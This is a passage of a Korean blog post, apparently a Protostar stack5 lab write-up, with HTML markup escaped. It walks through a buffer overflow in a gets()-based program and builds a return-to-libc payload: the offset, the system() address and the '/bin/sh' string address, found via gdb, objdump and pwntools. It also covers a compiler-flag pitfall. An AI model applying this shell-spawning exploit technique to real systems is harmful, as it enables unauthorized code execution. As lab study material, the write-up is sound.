class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parameters&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reverse&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;order&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;물론 다른 함수 호출 규약을 쓴다면 그건 그거대로 반영해야 할 문제일 테다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;추가로, RET와 parameter 사이에 대체 왜 콜리의 리턴 주소가 위치하게 되는지 궁금할 수 있다. 만일 RTL로 실행한 Libc 함수가 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt;이라고 하면, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rip&lt;/code&gt;는 위의 스택 구조 중 (1)에 있는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; 함수의 엔트리로 점프하게 되고 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsp&lt;/code&gt;는 바로 아래인 (2)를 가리키게 될 것이다.
그런데 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cdedl&lt;/code&gt; calling convention에서 스택을 정리하고 만드는 것은 Caller이기 때문에 Callee인 함수 입장에서는 이미 스택 정리가 모두 되어 스택의 프롤로그인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;push rbp; mov rbp, rsp (이하 로컬변수 자리 확보 과정 생략)&lt;/code&gt;가 실행되기 직전까지의 행동이 모두 진행되었다고 생각할 것이다. 즉, 현재의 스택 프레임을 만들기 직전 과정인 Callee가 끝나고 다시 돌아가야 할 Caller의 이후 인스트럭션 주소인 RET가 스택에 전부 저장되었다고 생각할 것이다. 따라서 정규 과정 없이 RTL을 이용해 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt;을 콜했더라도 이 과정에서 Callee인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; 함수의 입장에서는 Caller의 RET까지가 전부 스택에 저장되어 있으리라 생각하므로 자동으로 (2)는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; 의 RET 주소로서 parameter를 가져올 때 건너뛰는 위치가 된다.
이로 인해 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;system&lt;/code&gt;인 (1)과 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; 에서 참조하는 파라미터들의 사이에 스택 한 주소만큼(4 byte)의 빈 공간이 생기게 되는 것이다. 
&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;13-실습&quot;&gt;1.3. 실습&lt;/h2&gt;

&lt;p&gt;어떠한 프로그램을 익스플로잇하기 위해서는 아래와 같은 과정을 거쳐야 한다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;대상 프로그램 분석해 취약점 지정&lt;/li&gt;
  &lt;li&gt;해당 취약점을 익스플로잇할 방법 지정&lt;/li&gt;
  &lt;li&gt;익스플로잇 생성&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;실습에서는 위의 과정에 따라 순차적으로 익스플로잇 방식을 설명한다.&lt;/p&gt;

&lt;h3 id=&quot;131-대상-프로그램-분석해-취약점-지정&quot;&gt;1.3.1. 대상 프로그램 분석해 취약점 지정&lt;/h3&gt;

&lt;p&gt;프로그램의 소스 코드를 주었기 때문에 문제의 난이도가 낮은 편이다. 아래 소스 코드를 분석하며 취약점을 찾아 보자.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt; 
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                                                        
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
 
  &lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;사용자의 입력값을 받아 지역 변수에 저장하는 간단한 프로그램이다. 그런데, 사용자의 입력값을 받을 때 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets&lt;/code&gt; 함수를 사용했다는 점에서 문제가 있다. 흔히 Boundary check라고 하는 사용자 입력값 길이 확인을 하지 않는 함수이기 때문이다. 즉, 위 프로그램의 문제는 gets 함수를 사용한 것으로, 해당 함수는 사용자가 주는 대로 전부 받아 저장하기 때문에 Buffer Overflow 취약점이 존재하는 함수이기 때문에 위 프로그램 또한 BOF 취약점을 가지게 되었다.&lt;/p&gt;

&lt;h3 id=&quot;132-bof-취약점-익스플로잇할-방법-지정&quot;&gt;1.3.2. BOF 취약점 익스플로잇할 방법 지정&lt;/h3&gt;

&lt;p&gt;이번에는 BOF와 연계한 RTL 방식으로 쉘을 딸 것이다. BOF-RTL에 사용될 페이로드가 아래와 같기 때문에, 성공시키기 위해 알아야만 하는 정보는&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;몇 바이트를 넣어야 EBP까지를 오염시킬 수 있는가&lt;/li&gt;
  &lt;li&gt;Libc의 어떤 함수를 쓸 것인가&lt;/li&gt;
  &lt;li&gt;해당 함수의 메모리상 주소는 무엇인가&lt;/li&gt;
  &lt;li&gt;Libc 내부에 해당 함수가 쉘을 실행시키도록 사용할 수 있는 파라미터가 하드코딩되어 있는가&lt;/li&gt;
  &lt;li&gt;그렇다면 해당 파라미터는 어디에 있는가&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;이다.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Library&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parameter&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;1.3.2.1. offset bytes 구하기&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;pwndbg를 stack5에 물려 보았다. 컴파일 옵션은 아래와 같다.(주의!! 아래 컴파일 옵션을 사용하면 안된다! &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-mpreferred-stack-boundary=2&lt;/code&gt; 로 해야 한다!!!! 이유는 마지막에 가서 설명하겠다)&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;gcc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mpreferred&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stack&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;boundary&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fno&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stack&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;protector&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;execstack&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;no&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fno&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pic&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;o&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stack5&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stack5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;disas main&lt;/code&gt; 명령어로 얻은 어셈블리 덤프는 아래와 같다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%201.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;main 함수가 파라미터를 받는 형식이라 해당 파라미터를 내부적으로 처리하기 위해 공간을 확보한다. 그러나 그것에 신경쓸 필요 없이, gets 심볼이 딸린 call 직전의 어셈블리어에 집중하다.&lt;/p&gt;

&lt;p&gt;gets는 파라미터로 char* 버퍼의 시작 주소를 받는다. 파라미터가 하나뿐이므로 cdecl 규약에 따라 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*(main+24)&lt;/code&gt;에서 스택에 push 되는 부분이 파라미터를 스택에 넣는 행위일 것이다. eax에 있는 값을 넣기 때문에 eax에 무슨 값이 들어가는지 따라가 보면, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[ebp-0x48]&lt;/code&gt; 을 lea 명령어를 이용해 eax에 주는 것을 확인할 수 있다. lea 명령어를 이용했으므로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[ebp-0x48]&lt;/code&gt; 은 주소로서 취급된다. 즉, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[ebp-0x48]&lt;/code&gt; 이 바로 BOF을 일으킬 시작 주소가 된다.&lt;/p&gt;

&lt;p&gt;buffer 변수는 64byte인데 왜 0x48, 즉 64+8 byte 만 주는지 궁금할 수 있다. 이전 포스트에서도 언급한 것처럼, gcc 컴파일러가 보안 정책의 일환으로 문자 배열을 만들 때 추가적으로 공간을 더 할당해 주기 때문이다. 일반적으로 8 byte~16 byte 정도의 공간을 더 주는 것으로 알고 있다.&lt;/p&gt;

&lt;p&gt;따라서, 0x48byte를 모두 채우면 ebp의 바로 위까지를 변조할 수 있기 때문에 우리가 주어야 할 &lt;strong&gt;offset byte는 0x48+0x4 = 0x4c byte&lt;/strong&gt;가 될 것이다.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;1.3.2.2. Library Function Address와 parameter 로 쓸 문자열 주소 구하기&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;먼저 쉘을 따는 데 사용할 수 있는 libc 내부 함수들이 많지만, 이번에는 system()함수를 사용해 보려 한다. system() 함수의 사용 규약은 아래와 같다.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt;&lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;https://man7.org/linux/man-pages/man3/system.3.html&quot;&gt;Document&lt;/a&gt;에 따르면, system() 함수는 fork(2) 시스템 콜을 이용해 execl(3) 함수를 실행하는 child process를 만들어 아래와 같은 커맨드를 실행한다.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;execl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;즉 command 변수에 들어간 문자열에 해당되는 쉘 명령어가 실행된다. 나는 쉘을 실행하고 싶기 때문에 /bin/sh를 넣어야 한다.&lt;/p&gt;

&lt;p&gt;그렇다면 system() 함수의 주소와 파라미터로 들어갈 “/bin/sh” 문자열이 하드코딩되어 있는 주소는 어떻게 구할 수 있을까. 크게 세 가지 방식이 있다. 1) gdb를 이용하기 2) libc에서 찾기 3) pwntools 이용해 libc 뒤지기.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;gdb 이용하기&lt;/p&gt;

    &lt;p&gt;프로그램이 시작해야 라이브러리가 메모리에 로딩되기 때문에 프로그램을 돌려놓고 system의 주소를 찾아야 한다. 그러나 그냥 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r&lt;/code&gt; 명령어로 프로그램을 돌려버리면 프로그램이 끝나버려서 메모리에 로딩된 라이브러리도 증발한다. 따라서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;b main&lt;/code&gt; 명령어로 브레이크 포인트를 걸고 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r&lt;/code&gt; 명령어를 입력한다.&lt;/p&gt;

    &lt;p&gt;이후 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p system&lt;/code&gt; 명령어를 입력하면 아래와 같은 결과를 볼 수 있다.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%202.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;이제 ‘/bin/sh’ 문자열을 찾아야 한다. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find &amp;amp;system,+999999999,&quot;/bin/sh&quot;&lt;/code&gt; 명령어를 이용하면 쉽게 찾을 수 있다. system 함수의 시작 주소부터 명시된 숫자만큼 올려가며 주어진 문자열을 찾으라는 명령어다.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%203.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;libc에서 찾기&lt;/p&gt;

    &lt;p&gt;타겟 프로그램이 사용하는 라이브러리와 그것이 적재되는 주소를 알아낼 수 있는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ldd {program_name}&lt;/code&gt; 명령어를 사용한다.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%204.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;libc 라이브러리의 디렉토리상의 위치와 실질 메모리상 적재 위치를 알 수 있다.&lt;/p&gt;

    &lt;p&gt;그럼 objdump를 이용해 libc.so.6 상에 위치하는 system 함수의 오프셋을 알아내면 된다.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%205.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x3d3d0&lt;/code&gt;이 system 함수의 오프셋인 것처럼 보인다. 실제로 libc.so.6의 시작 주소인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xf7dde000&lt;/code&gt; 에 오프셋인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x3d3d0&lt;/code&gt;을 더하면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xf7e1b3d0&lt;/code&gt;으로 system 함수의 시작 주소가 맞다.&lt;/p&gt;

    &lt;p&gt;그런데 궁금증이 생긴다. 저기 libc_system 뒤에 붙어 있는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@@GLIBC_PRIVATE&lt;/code&gt;가 대체 뭐지? 궁금해서 알아보니 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@@&lt;/code&gt;는 default 버전임을 의미하고, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GLIBC_PRIVATE&lt;/code&gt; 심볼은 라이브러리 링커 내에서만 사용되는 내부 규약으로 링커가 공유 라이브러리들끼리 서로를 refer 할 때 쓰는 인터페이스의 wrapper를 의미한다는 점을 알게 되었다.&lt;/p&gt;

    &lt;p&gt;사실 계산을 잘못 해서 objdump로 알아낸 system 함수의 적재 주소와 gdb로 알아낸 주소가 다른 줄 알고 원인을 알아내고 싶어 삽질을 엄청나게 하는 바람에 리눅스의 파일 링크와 링커-공유 라이브러리 간의 호출에 대해 공부하게 되었는데, 해당 내용은 맨 밑에서 자세히 설명한다.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;pwntools 사용해 libc 뒤지기&lt;/p&gt;

    &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/lib/i386-linux-gnu/libc.so.6&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    
 &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;system = &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;system&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/bin/sh = &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/bin/sh&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/bin/sh = &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/bin/sh&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;위의 코드를 이용하면 아래와 같은 결과가 나온다.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%206.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;133-익스플로잇-생성&quot;&gt;1.3.3. 익스플로잇 생성&lt;/h3&gt;

&lt;p&gt;이제까지 알아낸 정보를 취합하면 페이로드의 구조를 아래와 같이 지정할 수 있다.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mh&quot;&gt;0x4c&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xf7e1b3d0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xf7f5c1db&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;하지만 여기에 함정이 있다. 초반에 설명했던 컴파일 옵션 때문이다. 컴파일 시 나는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mpreferred-stack-boundary=4&lt;/code&gt; 로 줬다. 원래는 64bit로 컴파일 하려다가 급하게 32bit로 방향을 바꾸는 바람에 값을 2로 바꾸는 걸 깜빡했다!!!!!!!!!!!!!!!!!!!!!!!!!!!!!&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mpreferred-stack-boundary&lt;/code&gt; 는 스택을 정리해 주고, 주어진 값을 n이라 할 때 2^n의 배수로 스택 프레임의 바닥이 지정되도록 align해주는 옵션이다. 32 bit 컴파일 시에는 값을 2로 줘야 4의 배수로 스택 프레임의 바닥이 정리되기 때문에 편하고, 64bit 컴파일 시에는 값을 4로 줘야 16의 배수로 스택 프레임의 바닥이 오면서 스택이 정리되기 때문에 편한데… 나는 32bit로 컴파일하면서 값을 4로 줬다. 그래서 함수의 에필로그가 변하는 바람에 자꾸만 페이로드가 먹히지 않았다.&lt;/p&gt;

&lt;p&gt;32 bit로 컴파일하면서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mpreferred-stack-boundary&lt;/code&gt; 를 제대로 설정하지 않으면 아래와 같은 에필로그가 나온다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%207.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;아무래도 해당 옵션의 디폴트 값이 4라서 16의 배수로 스택 프레임의 꼭대기가 끝나는 상황인지라, 필요한 것보다 더 할당된 스택을 정리하기 위해 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lea esp,[ecx-0x4]&lt;/code&gt; 인스트럭션이 추가되어 있다.&lt;/p&gt;

&lt;p&gt;옵션을 제대로 주면 해당 인스트럭션이 없는 클래식한 에필로그를 볼 수 있다.&lt;/p&gt;

&lt;p&gt;추가로 말하자면, 위와 같은 상황일 때 함수의 프롤로그도 새로운 형식이 되어 나타난다. 애초에 16의 배수로 스택 시작점을 align할 필요가 없는 32bit 프로그램이다 보니 억지로 ebp 주소를 16의 배수로 맞추기 위해 아래와 같은 프롤로그가 보인다.&lt;/p&gt;

